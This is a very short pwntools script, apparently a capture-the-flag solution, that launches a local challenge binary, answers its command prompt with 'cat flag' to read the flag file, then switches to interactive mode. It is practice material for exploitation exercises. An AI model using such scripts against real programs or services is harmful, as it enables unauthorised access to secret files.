from pwn import *

r = process('./get_your_shell')

r.recvuntil(b'Enter a command: ')

r.sendline(b'cat flag')
r.interactive()